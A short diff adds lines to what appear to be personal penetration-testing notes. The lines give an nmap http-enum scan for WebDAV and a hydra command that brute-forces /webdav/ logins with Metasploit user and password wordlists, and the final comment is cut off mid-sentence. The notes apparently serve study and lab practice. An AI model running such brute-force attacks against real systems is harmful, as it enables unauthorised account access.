@@ -676,8 +676,12 @@ nmap [ip] -sV -sC
 ```
 
 ```
+// scan to port 80 only and run a script to check if WebDav is configured
 
+nmap [ip] -p 80 --script=http-enum - you can then log in by going to the /webdav/ directory link
 
+// perform a brute force 
+hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlist/metasploit/common_passwords.txt [ip] http-get /webdav/  - here you start by specifying -L tag that means you don't know the user and you want to check for 
 ```
 
 ---
